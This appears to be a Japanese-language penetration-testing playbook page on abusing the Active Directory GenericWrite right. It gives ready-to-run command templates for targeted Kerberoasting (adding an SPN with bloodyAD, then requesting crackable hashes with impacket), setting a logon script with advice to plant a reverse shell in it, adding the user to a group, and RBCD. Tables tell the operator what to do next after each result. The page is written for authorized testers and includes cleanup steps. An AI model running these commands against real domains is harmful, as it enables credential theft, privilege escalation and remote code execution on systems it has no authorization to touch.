# GenericWrite の悪用

> **スコープ**: BloodHound で `GenericWrite` エッジ確認後、対象オブジェクトの属性書き込み権限を悪用する。Targeted Kerberoasting（SPN 付与）〜logon script 設定〜グループ追加〜RBCD（コンピューター）まで扱う。GenericAll より限定的な権限だが、複数の攻撃経路がある。

## 着火条件

BloodHound で `[現在のユーザー or グループ] --GenericWrite--> [ターゲットオブジェクト]` が確認できた場合。

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `targetedKerberoast.py`（GitHub: `ShutdownRepo/targetedKerberoast`・別途取得要）/ `bloodyAD`（`pip install bloodyAD --break-system-packages`）/ `impacket-GetUserSPNs`（標準搭載）
- 外部リソース依存: targetedKerberoast.py / bloodyAD はインターネットアクセス要

## 先に確認すること

- **SPN が既に付与されているか確認**: `impacket-GetUserSPNs` で先に確認し、既に付与済みなら Kerberoasting が直接使える
- **ターゲットオブジェクトの種別**（ユーザー / グループ / コンピューター）で悪用手法が分岐する

**GenericAll との違い:**

| 操作 | GenericWrite | GenericAll |
|------|-------------|-----------|
| 属性の書き込み | ✅ | ✅ |
| パスワードのリセット | ❌ | ✅ |
| オブジェクトの削除 | ❌ | ✅ |
| DACL の変更 | ❌ | ✅ |

**攻撃者の思考トレース:** GenericWrite はパスワードリセットができないが、SPN の付与（Targeted Kerberoasting）やグループメンバー変更で権限を昇格できる。targetedKerberoast.py が最も手軽（SPN 付与・ハッシュ取得・クリーンアップを一括）。

---

## 1. ユーザーオブジェクトへの GenericWrite — Targeted Kerberoasting（自動方式）

**コマンド:**

```bash
# [Attacker] SPN 付与・ハッシュ取得・クリーンアップを一括で実行
python3 targetedKerberoast.py -v \
  -d '[DOMAIN]' \
  -u '[CURRENT_USER]' \
  -p '[PASSWORD]' \
  --dc-ip [DC_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `$krb5tgs$23$...` ハッシュが出力される | Targeted Kerberoasting 成立 | hashcat でクラック → `../Kerberos_Attacks/Kerberoasting.md` |
| ツールが途中で失敗 | SPN が付与されたままの可能性 | `bloodyAD ... set object '[TARGET_USER]' servicePrincipalName -v ''` で手動クリーンアップ |

---

## 2. ユーザーオブジェクトへの GenericWrite — Targeted Kerberoasting（手動方式）

自動ツールが失敗する環境、または SPN 付与とハッシュ取得を分けて確認したい場合に使う。

**コマンド:**

```bash
# [Attacker] Step 1: ターゲットユーザーに SPN を手動追加（bloodyAD）
bloodyAD \
  -d '[DOMAIN]' --dc-ip [DC_IP] \
  -u '[CURRENT_USER]' -p '[PASSWORD]' \
  set object '[TARGET_USER]' servicePrincipalName \
  -v 'http/[任意の文字列]'

# [Attacker] Step 2: 付与した SPN でハッシュを取得
impacket-GetUserSPNs \
  -dc-ip [DC_IP] \
  -request \
  -request-user '[TARGET_USER]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'

# [Attacker] 原状回復（必須）: ハッシュ取得後に SPN を削除
bloodyAD -d '[DOMAIN]' --dc-ip [DC_IP] \
  -u '[CURRENT_USER]' -p '[PASSWORD]' \
  set object '[TARGET_USER]' servicePrincipalName -v ''
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| SPN 付与後にハッシュが取得できる | Targeted Kerberoasting 成立 | hashcat でクラック後、**必ず SPN を削除** |
| SPN 付与後も `No entries found!` | SPN のフォーマットが不正 / 付与に失敗 | bloodyAD の出力を確認。`-v` で別の SPN 形式を試す |

**注意（原状回復）:** 手動方式でハッシュ取得後は付与した SPN を必ず削除する（本番必須・演習でも習慣化推奨）。

---

## 3. ユーザーオブジェクトへの GenericWrite — logon script の設定

**コマンド:**

```powershell
# [Target] ターゲットがログインするたびにスクリプトが実行される
Set-ADUser -Identity [TARGET_USER] -ScriptPath '\\[DC]\netlogon\[script_name].bat'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ターゲットが次回ログイン時にスクリプトが実行される | logon script 設定成功 | スクリプトにリバースシェル等を仕込んでおく |

**注意:** ターゲットユーザーが実際にログインするまで実行されない（長時間待機が必要なことがある）。

---

## 4. グループオブジェクトへの GenericWrite — グループメンバーの追加

**コマンド:**

```powershell
# [Target] グループメンバーの追加
Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
```

---

## 5. コンピューターオブジェクトへの GenericWrite — RBCD 設定

`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性を変更して RBCD を設定できる。

**詳細 → `../Delegation_Attacks/RBCD.md`**

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| Targeted Kerberoasting でハッシュがクラックできない | パスワードが強力 | logon script 設定（§3）またはグループ追加（§4）へ |
| logon script が実行されない | ターゲットがログインしていない | 長時間待機。または別の手法へ |

---

## 注意点・落とし穴

- targetedKerberoast.py が途中で失敗した場合は手動で SPN をクリーンアップする（bloodyAD で空に設定）
- SPN を設定する際、ターゲットアカウントが既に SPN を持っている場合は Kerberoasting が既に可能な場合もある。`impacket-GetUserSPNs` を先に実行して確認する

---

## 関連技術

- 前：BloodHound で GenericWrite 権限を発見後 → `../../05_Tools_Reference/BloodHound.md`
- 後：SPN 付与後のハッシュ取得 → `../Kerberos_Attacks/Kerberoasting.md`
- 関連：コンピューターオブジェクトへの RBCD → `../Delegation_Attacks/RBCD.md`
